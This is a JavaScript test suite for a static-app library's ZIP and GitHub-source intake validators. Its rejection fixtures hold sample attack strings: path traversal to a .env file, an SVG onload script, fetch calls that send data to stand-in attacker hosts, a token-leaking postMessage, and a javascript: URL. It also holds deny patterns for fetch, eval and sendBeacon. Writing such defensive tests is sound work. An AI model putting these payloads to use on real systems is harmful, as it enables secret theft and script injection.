import test from 'node:test';
import assert from 'node:assert/strict';
import {readFileSync} from 'node:fs';
import {deflateRawSync,inflateRawSync} from 'node:zlib';
import {createHash} from 'node:crypto';
import {validateBrowserZip,validateGitHubSource,buildLibraryReviewIssue,LIMITS}
 from '../site/library/intake-core.mjs';
import {validateStaticAppFiles,validateStaticZip,validateStaticDirectory,
 MAX_FILE_BYTES,MAX_APP_BYTES} from '../packages/library/validator.mjs';
import {validateLibraryCatalog,selectComparison,filterLibrary}
 from '../site/library/library-core.mjs';

const site=new URL('../site/library/',import.meta.url);
const read=name=>readFileSync(new URL(name,site));
const catalog=JSON.parse(read('catalog.json').toString('utf8'));
const minimal='<html lang="en"><head><title>Simple Static App</title></head><body>Hello.</body></html>';
const crc32=b=>{
 let c=0xffffffff;
 for(const x of b){c^=x;for(let i=0;i<8;i++)c=(c>>>1)^((c&1)?0xedb88320:0);}
 return (c^0xffffffff)>>>0;
};
function makeZip(items,{deflate=false,corrupt=false,symlink=false}={}){
 let offset=0;const bodies=[],centrals=[];
 for(const [name,body] of items){
  const content=Buffer.from(body),n=Buffer.from(name,'utf8');
  const packed=deflate?deflateRawSync(content):content,method=deflate?8:0;
  const local=Buffer.alloc(30);
  local.writeUInt32LE(0x04034b50,0);local.writeUInt16LE(20,4);
  local.writeUInt16LE(method,8);local.writeUInt32LE(crc32(content),14);
  local.writeUInt32LE(packed.length,18);local.writeUInt32LE(content.length,22);
  local.writeUInt16LE(n.length,26);
  bodies.push(local,n,packed);
  const central=Buffer.alloc(46);
  central.writeUInt32LE(0x02014b50,0);central.writeUInt16LE(20,4);central.writeUInt16LE(20,6);
  central.writeUInt16LE(method,10);central.writeUInt32LE((crc32(content)^(corrupt?1:0))>>>0,16);
  central.writeUInt32LE(packed.length,20);central.writeUInt32LE(content.length,24);
  central.writeUInt16LE(n.length,28);central.writeUInt32LE(offset,42);
  central.writeUInt32LE(((symlink?0xa1ff:0x81a4)<<16)>>>0,38);
  centrals.push(central,n);
  offset+=local.length+n.length+packed.length;
 }
 const directory=Buffer.concat(centrals);
 const end=Buffer.alloc(22);
 end.writeUInt32LE(0x06054b50,0);end.writeUInt16LE(items.length,8);
 end.writeUInt16LE(items.length,10);
 end.writeUInt32LE(directory.length,12);end.writeUInt32LE(offset,16);
 return Buffer.concat([...bodies,directory,end]);
}
test('actual first-party static apps and catalog are source-backed and canonical',async()=>{
 const data=validateLibraryCatalog(catalog);
 assert.equal(data.apps.length,2);
 assert.deepEqual(data.apps.map(x=>x.id),['json-inspector','contrast-checker']);
 for(const app of data.apps){
  const filename='apps/'+app.id+'/index.html';
  const content=read(filename);
  const result=validateStaticAppFiles(new Map([['index.html',content]]));
  assert.equal(result.entry,'index.html');
  assert.equal(result.reviewRequired,true);
  assert.equal(result.automaticHosting,false);
  const html=content.toString('utf8');
  assert.match(html,/Content-Security-Policy/);
  assert.match(html,/connect-src 'none'/);
  assert.match(html,/<h1>/);
  assert.match(html,/role="status"|aria-live="polite"/);
  assert.doesNotMatch(html,/fetch\(|XMLHttpRequest|localStorage|window\.top/);
 }
 const zip=makeZip([['index.html',read('apps/json-inspector/index.html')]],{deflate:true});
 const report=validateStaticZip(zip);
 assert.equal(report.files[0].path,'index.html');
 assert.equal(report.files[0].size,read('apps/json-inspector/index.html').length);
 assert.match(report.archiveSha256,/^[a-f0-9]{64}$/);
 assert.ok(report.totalBytes<MAX_APP_BYTES);
 assert.ok((await validateStaticDirectory(new URL('apps/contrast-checker/',site).pathname)).files.length===1);
});
test('source-backed feature comparison is ordered and excludes fabricated rankings',()=>{
 const apps=validateLibraryCatalog(catalog);
 assert.equal(selectComparison(apps,['contrast-checker','json-inspector'])[0].name,'Contrast Checker');
 assert.deepEqual(filterLibrary(apps.apps,'WCAG').map(x=>x.id),['contrast-checker']);
 assert.deepEqual(filterLibrary(apps.apps,'json').map(x=>x.id),['json-inspector']);
 assert.deepEqual(filterLibrary(apps.apps,'','Accessibility').map(x=>x.id),['contrast-checker']);
 assert.throws(()=>selectComparison(apps,['json-inspector','json-inspector']),TypeError);
 assert.throws(()=>selectComparison(apps,['json-inspector','outside']),TypeError);
 for(const value of [
  {...catalog,apps:[catalog.apps[0],catalog.apps[0]]},
  {...catalog,apps:catalog.apps.map((x,i)=>i?{...x,entry:'https://evil.example/app'}:x)},
  {...catalog,apps:catalog.apps.map((x,i)=>i?{...x,source:'https://evil.example'}:x)},
  {...catalog,apps:catalog.apps.map((x,i)=>i?{...x,verified:true}:x)},
  {...catalog,apps:catalog.apps.map((x,i)=>i?{...x,features:['x','x']}:x)}
 ])assert.throws(()=>validateLibraryCatalog(value),TypeError);
 const script=read('library.mjs').toString('utf8');
 assert.doesNotMatch(script,/innerHTML|localStorage|sessionStorage|eval\(|sendBeacon/);
 assert.match(script,/frame\.setAttribute\('sandbox','allow-scripts'\)/);
 assert.match(script,/frame\.src=app\.entry/);
});
test('ZIP32 parser handles stored/deflated files, UTF-8 and nested files without extraction',()=>{
 for(const deflate of [false,true]){
  const zip=makeZip([['index.html',minimal],['assets/theme.css','body{color:green}']],{deflate});
  const report=validateStaticZip(zip);
  assert.equal(report.files.length,2);
  assert.equal(report.files[0].path,'assets/theme.css');
  assert.equal(report.files[1].path,'index.html');
  assert.equal(report.reviewRequired,true);
 }
});
test('ZIP path traversal, special files, unknown sources, size and tampered checksums fail closed',()=>{
 const examples=[
  [['../outside.html',minimal]],
  [['index.html',minimal],['../../.env','secret']],
  [['index.html',minimal],['backend.php','<?php print(1) ?>']],
  [['index.html',minimal],['module.wasm','hello']],
  [['index.html',minimal],['app.svg','<svg onload=alert(1)>']],
  [['index.html',minimal],['evil.js','fetch("https://attacker.example")']],
  [['index.html',minimal],['evil.js','localStorage.setItem("x","y")']],
  [['index.html',minimal],['evil.js','eval("code")']],
  [['index.html',minimal],['data.json','{"url":"https://safe.example"}'],['Index.HTML',minimal]],
  [['index.html',minimal],['index.html',minimal]]
 ];
 for(const list of examples)assert.throws(()=>validateStaticZip(makeZip(list)),/Unsafe static app package/);
 assert.throws(()=>validateStaticZip(makeZip([['index.html',minimal]],{corrupt:true})),/checksum/);
 assert.throws(()=>validateStaticZip(makeZip([['index.html',minimal]],{symlink:true})),/symbolic link/);
 assert.throws(()=>validateStaticZip(Buffer.from('not-a-zip')),/Unsafe/);
 assert.throws(()=>validateStaticZip(Buffer.alloc(4*1024*1024+1)),/Unsafe/);
 assert.throws(()=>validateStaticZip(makeZip([['index.html','x'.repeat(MAX_FILE_BYTES+1)]])),/file size/);
});
test('Library UI maintains separate untrusted iframe and never self-hosts arbitrary ZIP code',()=>{
 const page=read('index.html').toString('utf8');
 assert.match(page,/<iframe id="library-frame" sandbox="allow-scripts" referrerpolicy="no-referrer"/);
 assert.doesNotMatch(page,/allow-same-origin|allow-top-navigation|allow-popups|allow-downloads/);
 assert.match(page,/not accepted directly onto the 24go\.top origin/);
 assert.match(page,/ZIP or GitHub source/);
 assert.match(page,/id="compare-open"/);
 assert.match(page,/id="library-search"/);
 assert.match(page,/id="library-category"/);
 assert.match(page,/href="https:\/\/24go\.top\/library\/"/);
});


const digest=async bytes=>createHash('sha256').update(bytes).digest('hex');
const inflate=async bytes=>new Uint8Array(inflateRawSync(bytes,{
 maxOutputLength:LIMITS.fileBytes+1
}));
const browserValidate=bytes=>validateBrowserZip(bytes,{digest,inflate});

test('browser ZIP intake round-trips stored/deflate ZIP32 with the independent Node validator',async()=>{
 for(const deflate of [false,true]){
  const entries=[['index.html',minimal],
   ['assets/ui.css','body{padding:12px}'],
   ['assets/app.js','const answer = 42;']];
  const zip=makeZip(entries,{deflate});
  const browser=await browserValidate(zip),node=validateStaticZip(zip);
  assert.deepEqual(browser,node);
  assert.equal(browser.automaticHosting,false);
  assert.equal(browser.reviewRequired,true);
  assert.equal(browser.files.length,3);
  assert.equal(browser.entry,'index.html');
  assert.equal(LIMITS.archiveBytes,4*1024*1024);
 }
});

test('browser intake rejects forged content, CRC corruption, traversal and package bombs',async()=>{
 const attacks=[
  [['../outside.html',minimal]],
  [['index.html',minimal],['../admin.js','bad']],
  [['index.html',minimal],['server.py','print(1)']],
  [['index.html',minimal],['index.html',minimal]],
  [['index.html',minimal],['Index.HTML',minimal]],
  [['index.html',minimal],['script.js','fetch("https://attacker.test/secret")']],
  [['index.html',minimal],['script.js','window.parent.postMessage("token","*")']],
  [['index.html',minimal],['module.js','new Function("return this")()']],
  [['index.html',minimal],['style.css','body{background:url(https://example.test/x)}']],
  [['index.html',minimal],['module.wasm','binary']]
 ];
 for(const entries of attacks){
  await assert.rejects(()=>browserValidate(makeZip(entries)),/Unsafe ZIP:/);
 }
 for(const options of [{corrupt:true},{symlink:true}]){
  await assert.rejects(()=>browserValidate(makeZip([['index.html',minimal]],options)),/Unsafe ZIP:/);
 }
 await assert.rejects(()=>browserValidate(Buffer.from('this is not a zip')),/Unsafe ZIP:/);
 await assert.rejects(()=>browserValidate(Buffer.alloc(LIMITS.archiveBytes+1)),/Unsafe ZIP:/);
 await assert.rejects(()=>browserValidate(makeZip([['index.html','X'.repeat(LIMITS.fileBytes+1)]])),/Unsafe ZIP:/);
 const deflateZip=makeZip([['index.html',minimal]],{deflate:true});
 await assert.rejects(()=>validateBrowserZip(deflateZip,{
  digest,inflate:async()=>new Uint8Array(LIMITS.fileBytes+1)
 }),/Unsafe ZIP:/);
 const huge=makeZip([['index.html',minimal],['data.json','a'.repeat(512*1024)]],{deflate:true});
 await assert.rejects(()=>validateBrowserZip(huge,{
  digest,inflate:async()=>new Uint8Array(LIMITS.fileBytes+50)
 }),/Unsafe ZIP:/);
});

test('app source-review link uses explicit safe GitHub origin and bounded metadata only',async()=>{
 const report=await browserValidate(makeZip([['index.html',minimal]],{deflate:true}));
 const url=buildLibraryReviewIssue({
  name:'Useful Static App',repository:'https://github.com/Contributor/example-app',report
 });
 const parsed=new URL(url);
 assert.equal(parsed.origin,'https://github.com');
 assert.equal(parsed.pathname,'/rf24kja/24GO.top/issues/new');
 assert.equal(parsed.searchParams.get('title'),'Library app review: Useful Static App');
 const body=parsed.searchParams.get('body');
 assert.match(body,/Public source: https:\/\/github.com\/Contributor\/example-app/);
 assert.match(body,new RegExp(report.archiveSha256));
 assert.match(body,/No ZIP was uploaded/);
 assert.ok(body.length<1200);
 assert.ok(!body.includes(minimal));
 assert.ok(!url.includes('index.html'));
 for(const candidate of [
  'http://github.com/owner/repo',
  'https://evil-github.com/owner/repo',
  'https://github.com.evil.test/owner/repo',
  'https://github.com/owner/repo?secret=x',
  'https://github.com/owner/repo/tree/main',
  'javascript:alert(1)',
  'https://github.com/owner/../private',
  'https://user:pass@github.com/owner/repo'
 ])assert.throws(()=>validateGitHubSource(candidate),TypeError,candidate);
 assert.throws(()=>buildLibraryReviewIssue({
  name:'A\nInjected issue',repository:'https://github.com/owner/repo',report
 }),TypeError);
 assert.throws(()=>buildLibraryReviewIssue({
  name:'Safe App',repository:'https://github.com/owner/repo',
  report:{...report,automaticHosting:true}
 }),TypeError);
});

test('browser intake uses no network calls, DOM execution, storage or implicit issue submission',()=>{
 const html=read('index.html').toString('utf8');
 const code=read('intake.mjs').toString('utf8');
 const core=read('intake-core.mjs').toString('utf8');
 assert.match(html,/id="library-zip"/);
 assert.match(html,/id="library-validate"/);
 assert.match(html,/id="library-review-link"/);
 assert.match(html,/type="module" src="\.\/intake\.mjs"/);
 assert.doesNotMatch(code,/\bfetch\s*\(|innerHTML|eval\s*\(|localStorage|sessionStorage|sendBeacon/);
 assert.doesNotMatch(core,/\bfetch\s*\(|innerHTML|eval\s*\(|localStorage|sessionStorage|sendBeacon/);
 assert.match(code,/selected\.arrayBuffer\(\)/);
 assert.match(core,/DecompressionStream\('deflate-raw'\)/);
 assert.match(html,/The review link sends only/);
});
